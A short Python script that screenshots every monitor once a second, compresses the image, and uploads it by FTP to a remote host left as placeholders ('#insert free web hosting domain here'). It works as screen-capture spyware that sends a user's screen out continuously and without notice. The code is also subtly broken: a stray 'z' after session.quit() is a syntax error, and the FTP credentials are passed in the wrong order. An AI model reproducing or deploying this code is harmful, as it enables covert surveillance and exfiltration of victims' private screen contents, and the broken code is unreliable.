import cv2
import threading
import ftplib 
from mss import mss

def server_upload():
    threading.Timer(1, server_upload).start()    
    with mss() as sct:
        sct.shot(mon=-1, output="te.png")
    img = cv2.imread('te.png')
    cv2.imwrite('test.jpg', img, [cv2.IMWRITE_JPEG_QUALITY, 1])
    session = ftplib.FTP('#insert free web hosting domain here','#insert your password here','#insert your username here')
    session.cwd('#insert your webpage URL here')
    file = open('test.jpg','rb')                 
    session.storbinary('STOR test.jpg', file)     
    file.close()                                   
    session.quit()z
    print("upload Success")
    
server_upload()